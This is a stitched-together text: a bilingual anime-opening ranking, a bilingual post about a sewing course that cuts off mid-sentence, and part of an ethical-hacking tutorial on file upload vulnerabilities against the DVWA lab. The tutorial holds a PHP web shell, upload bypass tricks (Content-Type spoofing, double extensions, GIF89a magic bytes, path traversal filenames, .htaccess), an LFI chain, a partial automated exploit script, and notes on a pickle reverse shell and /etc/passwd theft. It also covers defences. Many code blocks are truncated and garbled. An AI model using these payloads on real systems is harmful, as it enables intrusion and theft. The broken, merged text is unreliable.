>We often talk about the latest anime that are generating buzz, but we rarely focus on their opening themes, which ultimately play a crucial role in an anime's reception. As you know, there are many new titles this season, meaning that each one has a new opening theme to discuss. Very few people pay attention to this, but I'm not one of them, and that's why today I want to make a short list of what I consider the best opening themes based on my personal taste, understanding that this is all subjective. I don't know if you'll agree with me, but if not, please leave your own in the comments.

> Comentamos muchos acerca de los últimos anime que están dando de que hablar pero poco nos enfocamos en sus opening, cosa que al final termina por ser muy importante para la aceptación de cada anime. Como saben en esta temporada hay muchos títulos nuevos lo que significa que por cada uno tenemos un nuevo opening del que hablar. Muy pocas personas se fijan en esto, no es mi caso y es por eso que hoy quiero hacer un pequeño top con los que para mi son los mejores en función de mis gustos entendiendo que todo esto es subjetivo. No se si estarán de acuerdo conmigo pero en caso de que no pues déjenme los suyos en los comentarios. #### - HIDANE - Tatsuya Kitani [Nippon Sangoku] https://www.youtube.com/watch?v=iwtr3Mz9IDE

>Our friend Tatsuya is one of the best composers and singers in the anime world today. He's a guy who has songs for JJK, Hell's Paradise, BLEACH, and many more, so he's made a name for himself in a very solid way. For me, if an opening theme sticks with me from the first moment I hear it, it's a sign that he did his job. I think what I like most about this one is the combination of sounds it has; it's a mix of traditional elements—because you can hear them in the background—with modern, 90s J-pop. Also, something that really hooked me was the brass sound (trumpets), which isn't very common. The song is incredibly catchy, with a rhythm that makes you want to listen to it all the time, and then there are the lyrics. Sometimes you need to look up what they mean, and in this case, it talks about overcoming adversity, about having hope, about always expecting the best despite the circumstances or how terrible everything around you might be. If you look closely, you'll see it goes hand in hand with the story, and it's one of the things Tatsuya does perfectly: capturing the essence of the anime through the lyrics. This opening is top-notch, one of the best.

> Nuestro amigo Tatsuya es uno de los mejores compositores y cantantes en la actualidad dentro del mundo del anime. Es un tipo que tiene canciones en JJK, Hell’s Paradise, BLEACH y un largo etc por lo que ha logrado hacerse un nombre de una manera muy sólida. A mi lo que me pasa es que si desde el primer momento que escucho un opening se me queda grabado para mi es una señal de que hizo el trabajo. Creo que lo que más me gusta de este es la combinación de sonidos que tiene y es que es una mezcla de lo tradicional, porque en el fondo se escucha, con lo moderno, con ese j-pop de los 90. Además algo de lo que me enganchó mucho también es el sonido de metales (trompetas), algo que no es tan común. La canción es sumamente pegajosa, tiene un ritmo que te hace querer escucharla siempre y bueno la letra. A veces es necesario buscar que dice y en este caso nos habla de como superar la adversidad, como tener esperanza, de como siempre esperar lo mejor a pesar del ambiente o lo terrible que pueda ser todo lo que te rodea. Si se ponen a ver es algo que va de la mano con lo que es la historia y es de las cosas que Tatsuya hace a la perfección, plasmar el anime con las letras. Muy top este opening, de los mejores. --- #### - FLY AWAY - Vaundy [Yomi no Tsugai] https://www.youtube.com/watch?v=2_Imz9SXYgM

>When things are so obvious, it's easier to do them, or in this case, to choose them. It's known that Yomi no Tsugai is destined to be one of the best anime of the year; I don't know if it's the best, but it's definitely in the top 3. And since that's so certain, it can't have a low-quality opening, and look, it doesn't. Vaundy is in charge of this super-top, electrifying song, but who is he? - Just like Kitani, he also has songs scattered around that you've probably heard without realizing it. \

from Chainsaw Man can also be heard in Sakamoto Days, My Hero Academia, etc. These are men who know what they're doing because they're able to capture what an opening or anime song needs to be a success. \

is exactly everything a good opening should be, and I'm sure many will agree. Aside from being very rock-oriented and having obvious J-pop influences, it has very nostalgic and resilient lyrics. It speaks of enduring life's burdens while also expressing a kind of pessimism about the future. The lyrics are melancholic, but the rhythm is quite the opposite. I think we're looking at one of the best opening themes of the season, just like with the anime.

> Cuando las cosas son tan evidentes es más fácil hacerlas o en este caso escogerlas. Se sabe que Yomi no Tsugai está llamado a ser de los mejores anime del año, no se si el mejor pero del top 3 no se baja seguro y como eso es tan así no puede tener un opening de baja calidad y miren que no lo tiene. Vaundy es el encargado de esta canción super top y eléctrica pero quien es él? - al igual que Kitani también tiene canciones por ahí regadas que probablemente has escuchado y no lo sepas. \

de Chainsaw Man, en Sakamoto Days también se puede escuchar, My Hero Academia, etc. Son hombres que saben lo que hacen porque son capaces de plasmar lo que un opening o canción para anime necesita para ser un éxito. Fly Away es exactamente todo lo que un buen opening es y estoy seguro de que muchos estarán de acuerdo. A parte de ser muy rock y con obvias influencias en el j-pop tiene una letra muy nostalgica y resiliente, habla de soportar las cargas que la vida te puede poner al mismo tiempo de una especie de pesimismo por el futuro. La letra es melancólica más no el ritmo, este es todo lo contrario. Creo que estamos, al igual con el anime, ante uno de los mejores OP de la temporada. 

---

#### - Bubble - yorushika [Liar Game] 

https://www.youtube.com/watch?v=OHAjc-ayhus

<div class=\

>For this song selection, my inner musician came out, and musically speaking, this track is incredible. Yorushika is the duo behind it—yes, they're a duo composed of a producer, N-buna, and a vocalist, Sue. A few things to mention. First, they collaborated with Eve on the anime Witch Hat Atelier, whose opening theme is also top-notch. Second, they've collaborated on other projects, and some of the songs you hear on Frieren might even be from them. So, what can I say about the song itself? For me, it's the best of the three. The instrumental quality is top-notch, supreme, monumental, and if you listen to the guitar in the background, you'll know those riffs are pure poetry. That blend of jazz, alternative rock, and touches of J-pop gives the song a unique sound. Sue's voice is delicate yet powerful enough to convey the meaning of the lyrics, which are nothing less than a sense of weariness and how overwhelming life can be. This song is absolutely fantastic, it's going straight onto my playlist.

> Para la selección de esta canción se me salió la vena de músico que tengo interna y es que a nivel musical, valga la redundancia, este tema es increíble. Yorushika es el dúo encargado porque si, son un dúo compuesto por un productor, N-buna y una vocalista, Sue. Varias cosas que decir. La primera es que esta gente colaboró con Eve para el anime Witch Hat Atelier, cuyo OP también es muy top. Lo segundo es que han colaborado en otras cosas más y es que lo que algunas de las canciones que se escucha en Frieren puede que vengan de ellos. Entrando en el tema pues que puedo decir? - para mi es el mejor de los 3. La calidad instrumental es top, suprema, monumental y es que si escuchan la guitarra de fondo sabrán que esos riff son poesía para los oídos. Esa mezcla entre el jazz, el rock alternativo y los toques de nuevo del j-pop le dan un sonido unico a la canción. La voz de Sue es delicada pero con la fuerza necesaria para transmitir el significado de la letra que no es otro que el desgano por las cosas y por lo abrumadora que puede ser la vida. Súper top este tema, de una va para mi playlist. --- ***

Well folks, that's all for today. I hope you enjoyed it. ¡Hugs to everyone, see you next time!
*** > Bueno mi gente por hoy es todo, espero que les haya gustado. ¡Un abrazo a todos, nos escuchamos en la próxima!

body.title: Evolución💁: Iniciando un Curso de Costura 🧵 (Esp/Eng) Evolution💁: Starting a Sewing Course 🧵
body.body:
?*
‎Pues es una expresión para representar esas vivencias orientadas hacia algo nuevo y desconocido. Transmite la idea de una nueva etapa, por muy sencilla que sea, enfocada a crecer y compartir las anécdotas implícitas. De eso tratarán mis publicaciones con esa palabra en el título. 
‎
‎Bueno, ahora al grano. Escribí en mi presentación en Hive  que, sin planificarlo, estaba aprendiendo a reparar máquinas de coser... Y también aprendiendo a coser [ 🪡 y quiero contar como me va con eso 🚧

#

---

Why “Evolution”?
Well, it’s a term that captures those experiences focused on something new and unknown. It conveys the idea of a new phase—no matter how simple—centered on growth and sharing the stories that come with it. That’s what my posts with that word in the title will be about. 
‎
‎Okay, let’s get to the point. I wrote in my introduction that, without planning it, I was learning to repair sewing machines... And also learning to sew [ 🪡 and I want to share how that’s going 🚧

#
---
https://hive.blog/hive-110011/@moito/introduce-myself-about-me-esp-eng-breve-sinopsis-llamada-humberto

---

#


‎Hace dos semanas Anne002 y yo nos anotamos para un curso de costura en nuestra ciudad, Cantaura. Aún no estaba definido la hora y fecha para comenzar pues faltaban por inscribirse más voluntarios para cerrar la matrícula y debíamos esperar un poco. 
‎Llevaba varios días conteniendo algo de ansiedad por la espera -típico 😒-. Mientras, me había tomado la precaución, con tiempo, de ir comprando materiales que supuse pedirían para un curso de costura: hilos 🧵, agujas 🪡, cinta métrica 📏, alfileres, 📌📍, tiza para tela... tomando en cuenta que lo más importante, la máquina de coser, ya la tenemos. 
‎
‎Llegó por fin el lunes 04 de mayo. Estábamos avisados para darnos cita a las 3:00 pm. Mientras daban la una y media de la tarde, se suspendió el servicio eléctrico 😒. Hacía un calor de locos 🥵 pero eso no fue impedimento para asistir 🤠

#

---

#


Two weeks ago, Anne002 and I signed up for a sewing class in our town, Cantaura. The start date and time hadn’t been set yet because more participants needed to sign up to fill the class, so we had to wait a little while. 
I’d been feeling a bit anxious about the wait for several days—typical 😒. In the meantime, I had taken the precaution, ahead of time, of buying the materials I assumed they would ask for in a sewing class: thread 🧵, needles 🪡, measuring tape 📏, pins 📌📍, fabric chalk... keeping in mind that the most important thing, the sewing machine, we already have. 
‎
Monday, May 4, finally arrived. We had been told to meet at 3:00 pm. Just as it was 1:30 in the afternoon, the power went out 😒. It was insanely hot 🥵, but that didn’t stop us from going 🤠

#

---

#

La impresión de nuestra primera clase puedo resumirla con optimismo: nuestro maestro facilitador resultó ser un hombre con amplia experiencia y talento. Ha confeccionado trajes de gala 💃para concursantes de certámenes de belleza 👑 y además tiene una firma comercial donde monetiza su conocimiento así que estamos en buenas manos. 
‎
‎Para variar, se siente raro hasta ahora ser el único varón (estudiante) del grupo. La mayor parte resultaron ser mujeres maduras, salvo por mi Annie 🥹🥰. En apariencia no tengo la más mínima pinta de costurero, y nadie se imaginaría que yo pretendiera aprender este oficio 🤭, lo digo porque aunque no tiene nada de extraño, en Venezuela culturalmente suele relacionarse \

más con mujeres que con hombres. Pero así soy yo 😎, siempre rompiendo los esquemas 😜

#

---

#

I can sum up my impression of our first class with optimism: our instructor turned out to be a man with extensive experience and talent. He has made formal gowns 💃 for beauty pageant contestants 👑 and also runs a business where he monetizes his expertise, so we’re in good hands. 
‎
‎For a change, it feels strange so far to be the only male (student) in the group. Most of them turned out to be mature women, except for my Annie 🥹🥰. On the surface, I don’t look the least bit like a seamster, and no one would imagine that I’d want to learn this trade 🤭. I say this because, although there’s nothing strange about it, in Venezuela “sewing” is culturally associated more with women than with men. But that’s just me 😎—always breaking the mold 😜

#

---
#

![](https://images.ecency.com/DQmbFJkCgjh3eDWLZX6p4kySnyCdTMKiKz4dQU4dmGeFkLx/1777987343493.jpg)
#
---

#

Tengo los mejores motivos: primero, adquirir destreza en un oficio que en cualquier lugar, en cualquier circunstancia y para cualquier persona es útil; y segundo porque me propuse apoyar incondicionalmente a mi novia @anne002 en todo lo que estuviese a mi alcance 😌. Se muy bien lo feo que se siente tener un sueño y la voluntad de alcanzarlo pero no tener ni los medios ni el apoyo de nadie para lograrlo 💔😪. Supongo que todos alguna vez hemos vivido eso.
‎
‎La instalación donde veremos clases es un lugar modesto,  sencillo, optimizado para adultos en formación de artes y oficios. Se trata de la Escuela para el Emprendimiento \

, y ahora que lo pienso 🤔 no tengo la más mínima idea de a quién pertenece ese nombre ni de dónde lo sacaron 😅🤭. Algo más para investigar.

#

---

#

I have the best reasons: first, to master a skill that’s useful anywhere, under any circumstances, and for anyone; and second, because I decided to unconditionally support my girlfriend @anne002 in any way I can 😌. I know all too well how awful it feels to have a dream and the will to achieve it but lack both the means and anyone’s support to make it happen 💔😪. I suppose we’ve all experienced that at some point.
‎
‎The facility where we’ll be taking classes is a modest, simple place, optimized for adults learning arts and crafts. # Learn Ethical Hacking (#20) - File Upload Vulnerabilities - When Users Upload Weapons

![leh-banner.jpg](https://images.hive.blog/DQmc2LpoeHUPesc4Dy8haRKLJgfuDY6UBKdc3sED8Dz3JH9/leh-banner.jpg)

### What will I learn

- Why **file uploads** are one of the most dangerous features in web applications;
- **Web shell uploads**: getting command execution through image upload forms;
- **Bypassing file type validation**: extension tricks, MIME type spoofing, magic bytes;
- **Content-Type manipulation** and double extensions;
- Exploiting DVWA's file upload at all security levels;
- Defense: **proper validation**, isolated storage, and filename sanitization.

### Requirements

- A working modern computer running macOS, Windows or Ubuntu;
- Your hacking lab from Episode 2 (Kali + DVWA);
- Basic PHP knowledge (enough to understand a one-line web shell);
- The ambition to learn ethical hacking and security research.

### Difficulty

- Intermediate

### Curriculum (of the `Learn Ethical Hacking` series):

- [Learn Ethical Hacking (#1) - Why Hackers Win](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-1-why-hackers-win)
- [Learn Ethical Hacking (#2) - Your Hacking Lab](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-2-your-hacking-lab)
- [Learn Ethical Hacking (#3) - How the Internet Actually Works - For Attackers](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-3-how-the-internet-actually-works-for-attackers)
- [Learn Ethical Hacking (#4) - Reconnaissance - The Art of Not Being Noticed](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-4-reconnaissance-the-art-of-not-being-noticed)
- [Learn Ethical Hacking (#5) - Active Scanning - Mapping the Attack Surface](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-5-active-scanning-mapping-the-attack-surface)
- [Learn Ethical Hacking (#6) - The AI Slop Epidemic - Why AI-Generated Code Is a Security Disaster](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-6-the-ai-slop-epidemic-why-ai-generated-code-is-a-security-disaster)
- [Learn Ethical Hacking (#7) - Passwords - Why Humans Are the Weakest Cipher](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-7-passwords-why-humans-are-the-weakest-cipher)
- [Learn Ethical Hacking (#8) - Social Engineering - Hacking the Human](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-8-social-engineering-hacking-the-human)
- [Learn Ethical Hacking (#9) - Cryptography for Hackers - What Protects Data (and What Doesn't)](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-9-cryptography-for-hackers-what-protects-data-and-what-doesnt)
- [Learn Ethical Hacking (#10) - The Vulnerability Lifecycle - From Discovery to Patch to Exploit](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-10-the-vulnerability-lifecycle-from-discovery-to-patch-to-exploit)
- [Learn Ethical Hacking (#11) - HTTP Deep Dive - Request Smuggling and Header Injection](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-11-http-deep-dive-request-smuggling-and-header-injection)
- [Learn Ethical Hacking (#12) - SQL Injection - The Bug That Won't Die](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-12-sql-injection-the-bug-that-wont-die)
- [Learn Ethical Hacking (#13) - SQL Injection Advanced - Extracting Entire Databases](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-13-sql-injection-advanced-extracting-entire-databases)
- [Learn Ethical Hacking (#14) - Cross-Site Scripting (XSS) - Injecting Code Into Browsers](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-14-cross-site-scripting-xss-injecting-code-into-browsers)
- [Learn Ethical Hacking (#15) - XSS Advanced - Bypassing Filters and CSP](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-15-xss-advanced-bypassing-filters-and-csp)
- [Learn Ethical Hacking (#16) - Cross-Site Request Forgery - Making Users Attack Themselves](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-16-cross-site-request-forgery-making-users-attack-themselves)
- [Learn Ethical Hacking (#17) - Authentication Bypass - Getting In Without a Password](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-17-authentication-bypass-getting-in-without-a-password)
- [Learn Ethical Hacking (#18) - Server-Side Request Forgery - Making Servers Betray Themselves](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-18-server-side-request-forgery-making-servers-betray-themselves)
- [Learn Ethical Hacking (#19) - Insecure Deserialization - Code Execution via Data](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-19-insecure-deserialization-code-execution-via-data)
- [Learn Ethical Hacking (#20) - File Upload Vulnerabilities - When Users Upload Weapons](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-20-file-upload-vulnerabilities-when-users-upload-weapons) (this post)

### Solutions to Episode 19 Exercises

**Exercise 1 -- Deserialization exploitation chain:**

```
(a) File creation: __reduce__ returns (os.system, ('touch /tmp/pickle-pwned',))
    Result: /tmp/pickle-pwned created. Verified with ls -la.

(b) Data exfiltration: __reduce__ returns (os.system, ('cp /etc/passwd /tmp/stolen',))
    Result: /etc/passwd copied to /tmp/stolen. Full user list captured.

(c) Reverse shell: __reduce__ opens socket back to Kali on port 4444.
    Result: interactive shell as www-data. Full server access.

All three payloads are ~100-200 bytes. They fit in any cookie or
POST parameter. The attack is completely invisible to the user.
```

The key insight: the `__reduce__` method is an RCE primitive. Any Python function can be called with any arguments. The payload is tiny and the attack is invisible.

**Exercise 2 -- Pickle analyzer:**

```python
import pickletools, base64, io

def analyze(b64_payload):
    data = base64.b64decode(b64_payload)
    output = io.StringIO()
    pickletools.dis(data, output)
    disasm = output.getvalue()

    dangerous = ['os.system', 'subprocess', 'os.popen', 'exec',
                 'eval', 'builtins', '__import__']

    print(\

)

# Benign dict: DICT/MARK/STRING opcodes only
# Malicious: GLOBAL 'os' 'system' + REDUCE opcodes visible
```

The key insight: pickle opcodes are inspectable without execution. In production, reject any pickle containing GLOBAL/REDUCE opcodes referencing dangerous modules.

**Exercise 3 -- Before/after Flask app:**

```
Before (pickle sessions): attacker crafts malicious cookie ->
  server deserializes -> RCE. Attack succeeds.

After (JSON + HMAC): attacker modifies JSON -> HMAC validation fails.
  Attacker crafts JSON with code -> json.loads() only produces data.
  Both attacks fail independently. Defense in depth.
```

---

# Learn Ethical Hacking (#20) - File Upload Vulnerabilities

Every vulnerability we've covered from episode 11 onwards exploits the boundary between user input and application logic. SQL injection (episodes 12-13) targets the database layer through text fields. XSS (episodes 14-15) targets the browser through text fields. CSRF (episode 16) abuses the browser's cookie behavior. Authentication bypass (episode 17) targets the identity check itself. SSRF (episode 18) turns the server into a proxy. Insecure deserialization (episode 19) turns data into executable code. In all of those cases, the attack vector is a string -- text in a form field, a URL parameter, a cookie value, a JSON blob.

File uploads are different. The attack vector is an entire file -- a binary blob with a name, an extension, MIME headers, magic bytes, and arbitrary content. The application has to make decisions about what the file IS (is it an image? a PDF? a spreadsheet?) and where to PUT it (in a temp directory? the web root? a cloud bucket?). Every one of those decisions is a potential vulnerability. And unlike text-based attacks where the worst case is usually data leakage or session hijacking, a successful file upload attack gives you **remote code execution**. You upload a web shell. The server executes it. You have a shell. _Klaar._

_De vijand uploadt zijn wapen via jouw eigen website._

### The Simplest Web Shell

A PHP web shell in its most basic form:

```php
<?php system($_GET['cmd']); ?>
```

One line. When this file is accessible on a PHP-enabled web server, visiting `http://target/uploads/shell.php?cmd=whoami` executes `whoami` on the server and returns the output. That's it. The `system()` function runs a shell command, and `$_GET['cmd']` takes the command from the URL query string. The attacker controls the input, the server runs it as a system command, and the output comes back in the HTTP response.

More sophisticated shells exist -- **c99** has a full file manager, database client, and network tools built in. **b374k** gives you a web-based terminal with syntax highlighting. **weevely** generates obfuscated PHP shells with encrypted communication channels. But understanding starts with this single line: user input reaches a system command function. Everything else is UI on top of that core idea ;-)

### DVWA File Upload: Low Security

Navigate to **DVWA > File Upload** with security set to **Low**.

The page says \

Here we go!

Create the web shell:

```bash
echo '<?php system($_GET[\

]); ?>' > /tmp/shell.php
```

Upload `shell.php` through DVWA's upload form. It succeeds. DVWA tells you the file was uploaded to `../../hackable/uploads/shell.php`.

Now visit:

```bash
curl \

# Linux metasploitable 2.6.24-16-server ...
```

You have command execution on the server. From an image upload form. The application asked for a picture and you gave it a weapon. The server stored it in a web-accessible directory, the web server recognized the `.php` extension and executed it, and now you control the machine.

Let's look at the vulnerable code to understand WHY this works:

```php
<?php
// DVWA Low security -- NO validation at all
if (isset($_POST['Upload'])) {
    $target_path = DVWA_WEB_PAGE_TO_ROOT . \

and trusting their answer.

**Method 1: Change the Content-Type header**

Using Burp Suite, intercept the upload request. Find the `Content-Type: application/x-php` line in the multipart form data and change it to `Content-Type: image/jpeg`. The server checks the header (which the CLIENT controls), not the actual file content.

```bash
# Or with curl -- force Content-Type to image/jpeg
curl -X POST \

```

The server sees `image/jpeg` in the Content-Type. It accepts the upload. The file is still PHP. It still executes. The validation checked a header that the attacker controls -- which is no validation at all. Having said that, this does stop casual users who just click the upload button normally. But anyone with Burp or curl (which is every attacker, ever) bypasses this in seconds.

**Method 2: Double extension**

Some filters check the file extension. But the definition of \

depends on how you parse it:

```bash
cp /tmp/shell.php /tmp/shell.php.jpg    # Bypass filters checking for .jpg
cp /tmp/shell.php /tmp/shell.jpg.php    # Still executes as PHP on Apache
```

Apache processes `.php` regardless of additional extensions. The directive `AddHandler application/x-httpd-php .php` means any file with `.php` ANYWHERE in its extensions gets PHP processing. So `shell.jpg.php` passes a filter looking for `.jpg` in the filename but executes as PHP because Apache sees the `.php` extension. `shell.php.jpg` doesn't execute as PHP (Apache only cares about the final handler-matching extension), but it passes an extension blacklist that only checks the last extension.

The filter says \
and sees `shell.php.jpg` -- yes it does. But Apache says \

and sees `shell.jpg.php` -- yes it does. The filter and the web server disagree on what the file IS, and that disagreement is the vulnerability.

### High Security: Magic Bytes and Extension Checks

At High security, DVWA gets serious:

```php
<?php
// DVWA High security -- checks extension AND file content
if (isset($_POST['Upload'])) {
    $target_path = DVWA_WEB_PAGE_TO_ROOT . \
that identify GIF files). `getimagesize()` reads those bytes and says \

But the web server processes it as PHP because of the `.php` extension. The PHP interpreter ignores everything before the `<?php` tag and executes the code.

Having said that, the High security DVWA specifically checks for `.jpg`/`.jpeg` extensions, not `.gif.php`. So this particular bypass won't work directly against DVWA High -- you'd need to combine it with a **Local File Inclusion (LFI)** vulnerability. Upload the file as `evil.gif` (passes extension check and content check), then use LFI to include it as PHP:

```bash
# Upload as evil.gif (passes all checks at High)
printf 'GIF89a<?php system($_GET[\

# The PHP interpreter processes the included file -- GIF89a is treated as
# HTML output (garbage text), then <?php ... ?> executes
```

This is why vulnerabilities chain. A file upload restriction that is genuinely solid on its own becomes exploitable when combined with another seemingly minor vulnerability (LFI). The security of the system is not the security of any individual component -- it's the security of all components considered together ;-)

### Automated Upload Exploitation

Once you understand the bypass techniques, you can systematize them:

```python
#!/usr/bin/env python3
\

check = requests.get(check_url, params={'cmd': 'echo PWNED'},
                           cookies=COOKIES, timeout=5)
        if 'UPLOAD_SUCCESS' in check.text:
            return 'EXPLOITABLE'
        return 'UPLOADED (not executable)'
    return 'BLOCKED'

print(\

)
```

This script tests 8 different bypass techniques and reports which ones upload, which ones execute, and which ones are blocked. Against DVWA Low, everything uploads and executes. Against Medium, MIME type bypass and magic byte techniques work. Against High, you need the LFI chain.

In a real pentest, you'd expand this significantly -- test `.php3`, `.php4`, `.php7`, `.phar`, `.shtml`, `.asp`, `.aspx`, `.jsp`, `.config`, `.htaccess` (Apache config overrides!), null byte injections (`shell.php%00.jpg` on older PHP versions), and OS-specific tricks like NTFS Alternate Data Streams (`shell.php::$DATA` on Windows IIS).

### Path Traversal via Upload

Here's a bypass technique that doesn't get enough attention. Some upload forms let you control the filename, and the application uses that filename to construct the storage path. If the application doesn't sanitize `../` sequences, you can write the file anywhere on the filesystem:

```bash
# Instead of uploading \

, upload with filename:
../../../var/www/html/shell.php

# Or if the app strips \
once (common naive fix):\n....//....//....//var/www/html/shell.php\n# After one round of stripping \

, this becomes: ../../../var/www/html/shell.php

# Or use URL encoding:
%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fshell.php
```

This doesn't require the upload directory itself to be web-accessible. The attacker writes the file to a DIFFERENT directory that IS web-accessible. Even if the application stores uploads in `/var/uploads/` (outside the web root -- which is the correct practice), path traversal in the filename lets the attacker escape that directory and write to `/var/www/html/` where Apache will serve and execute it.

The fix is dead simple: never use the original filename. Generate a random UUID, map the extension from the detected content type, and store it. The orginal filename can be kept in a database for display purposes but should never be used as an actual filesystem path.

### Beyond PHP: Other Upload Attacks

File upload attacks aren't limited to PHP web shells:

**ASP/ASPX on IIS**: Upload `shell.aspx` with an ASP.NET web shell. IIS processes `.aspx` files the same way Apache processes `.php` -- any ASPX file in a web-accessible directory executes as server-side code.

**JSP on Tomcat**: Upload `shell.jsp`. Metasploitable2 has Tomcat running on port 8180 with default credentials (`tomcat:tomcat`) for the management panel. The manager app has a WAR file upload feature -- upload a WAR containing a JSP shell and Tomcat deploys it as a web application. You go from \

in one upload.

**SVG with embedded JavaScript**: SVG files are XML-based images that can contain `<script>` tags. Upload `evil.svg` and if the application serves it with `Content-Type: image/svg+xml` (which is correct for SVGs), the browser executes the JavaScript when someone views the image. This is stored XSS through an image upload form -- the application thinks it accepted a harmless image, but it's actually serving an XSS payload to every visitor who views it.

```xml
<?xml version=\

/>
</svg>
```

**HTML files**: Upload `phishing.html` -- now you're hosting a phishing page on the target's own domain. The URL looks completely legitimate (`https://legitimate-company.com/uploads/login.html`) because it IS on the legitimate domain. Browser security indicators show the padlock. The URL is correct. The SSL certificate is valid. And the page steals credentials.

**ZIP bombs**: A 42-kilobyte ZIP file that decompresses to 4.5 petabytes (that's `4,503,599,627,370,496` bytes). If the server automatically extracts uploaded archives (for virus scanning, content indexing, or \

features), a zip bomb consumes all available disk space and crashes the server. This is denial of service through a tiny file upload.

**Polyglot files**: Files that are simultaneously valid in multiple formats. A file can be a valid JPEG AND a valid PHP file -- it passes image validation but contains executable PHP code after the image data. Building polyglots is an art form in the security community, and tools like `polyglotgen` automate the process.

### The .htaccess Attack

On Apache servers, `.htaccess` files modify server configuration per-directory. If you can upload a `.htaccess` file to the uploads directory, you can tell Apache to execute ANY file type as PHP:

```apache
# .htaccess -- uploaded to the /uploads/ directory
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
```

Now every `.gif`, `.jpg`, and `.png` file in that directory is processed as PHP. Upload a \

GIF image that contains PHP code in its comment section (remember the `GIF89a` technique?), and Apache executes it. The extension whitelist is meaningless because you redefined what extensions mean.

This attack requires that Apache has `AllowOverride` enabled for the upload directory (which it often does by default), and that the upload form doesn't specifically blacklist `.htaccess` as a filename. Many upload validators check for `.php` and friends but never think about configuration files.

### The AI Slop Angle

This continues our thread from episodes 6, 12, 14, 16, 17, 18, and 19. AI-generated file upload code consistently makes the same mistakes:

- **Uses the original filename**: `path = os.path.join(UPLOAD_DIR, file.filename)` -- this is path traversal waiting to happen. The user controls `file.filename`, and `../` sequences let them write anywhere. The AI sees \

and doesn't consider adverserial filenames.

- **Checks Content-Type header instead of file content**: The header is set by the client. Checking it is like checking the label on a package instead of opening it. Trivially spoofed with curl or Burp.

- **Stores files in the web root**: `UPLOAD_DIR = '/var/www/html/uploads/'` -- directly accessible and executable by the web server. The AI picks the most convenient directory, not the safest one.

- **No size limits**: An attacker uploads a 10 GB file and fills the disk. Or uploads thousands of small files and exhausts inodes. The AI generates code that handles the happy path (user uploads a reasonable photo) and ignores the adversarial path.

- **No metadata stripping**: EXIF data in images can contain GPS coordinates (privacy leakage), XSS payloads in text fields, and even embedded thumbnails that are different from the displayed image. The AI doesn't strip metadata because the functional requirement is \

The pattern we've seen across 9 episodes now is always the same: AI generates code that WORKS for the intended use case but doesn't consider what happens when the input is adversarial. The file upload feature works perfectly when users upload actual images. It falls apart when someone uploads a PHP file pretending to be an image ;-)

### The Defense

Proper file upload handling requires multiple layers. Each layer independently blocks a different attack technique:

```python
import os
import uuid
import magic  # python-magic library -- detects file type from content
from PIL import Image

ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/gif'}
MAX_SIZE = 5 * 1024 * 1024  # 5MB
UPLOAD_DIR = '/var/uploads/'  # OUTSIDE web root -- critical!

def safe_upload(file_storage):
    \

# Layer 1: Check file size FIRST (prevents DoS before processing)
    file_storage.seek(0, 2)
    size = file_storage.tell()
    file_storage.seek(0)
    if size > MAX_SIZE:
        return None, \

# Layer 2: Check ACTUAL content type from file bytes (not the header)
    # python-magic reads magic bytes from file content -- this is what
    # the `file` command uses on Linux. It cannot be spoofed by changing
    # the Content-Type header.
    content = file_storage.read(2048)
    file_storage.seek(0)
    detected_type = magic.from_buffer(content, mime=True)
    if detected_type not in ALLOWED_TYPES:
        return None, f\

# Layer 3: Generate random filename (NEVER use the original)
    # This blocks path traversal, extension tricks, and filename-based
    # attacks in one move. The original name is discarded entirely.
    ext = {'image/jpeg': '.jpg', 'image/png': '.png', 'image/gif': '.gif'}
    safe_name = f\

# Layer 4: Save OUTSIDE web root
    # Even if somehow a PHP file gets through all checks, it can't
    # execute because the web server doesn't serve files from this dir
    path = os.path.join(UPLOAD_DIR, safe_name)
    file_storage.save(path)

    # Layer 5: Re-encode the image (strips metadata AND embedded payloads)
    # Opening with Pillow and re-saving produces a clean image with
    # no EXIF, no embedded PHP, no XSS in comment fields
    try:
        img = Image.open(path)
        img.save(path)
    except Exception:
        os.remove(path)
        return None, \

return safe_name, None
```

Key principles:

1. **Never trust the Content-Type header** -- detect the type from file content using `python-magic`
2. **Never use the original filename** -- generate a random UUID. Not a hash of the original name (still predictable), not a timestamp (guessable), an actual UUID
3. **Store outside web root** -- uploads should NEVER be directly accessible or executable by the web server
4. **Serve through a handler** -- when displaying uploaded images, use a download endpoint that explicitly sets `Content-Type: image/jpeg` and `Content-Disposition: inline` -- never let the web server guess the type from the extension
5. **Re-encode the image** -- Pillow's open-and-save cycle strips all metadata, destroys embedded payloads, and validates that the file is actually a parseable image
6. **Limit file size** -- prevent denial of service through large uploads

Having said that, even this isn't perfect. Some exotic image format vulnerabilities can survive re-encoding (ImageTragick, the 2016 ImageMagick RCE vulnerability, exploited image processing libraries themselves). But it stops 99% of file upload attacks, and the remaining 1% requires finding vulnerabilities in the image processing library itself -- which is a much higher bar than \

### Putting It All Together: The File Upload Attack Methodology

When you find a file upload feature during a pentest:

1. **Upload a normal file first** -- confirm the feature works and note where files are stored
2. **Try uploading a PHP shell directly** -- `.php`, `.php5`, `.phtml`, `.phar`. If it works, you're done (Low security scenario)
3. **Intercept with Burp and modify Content-Type** -- keep the PHP content, change the header to `image/jpeg`
4. **Try double extensions** -- `shell.jpg.php`, `shell.php.jpg`, `shell.php%00.jpg` (null byte)
5. **Try magic bytes** -- prepend `GIF89a` or valid JPEG headers before your PHP code
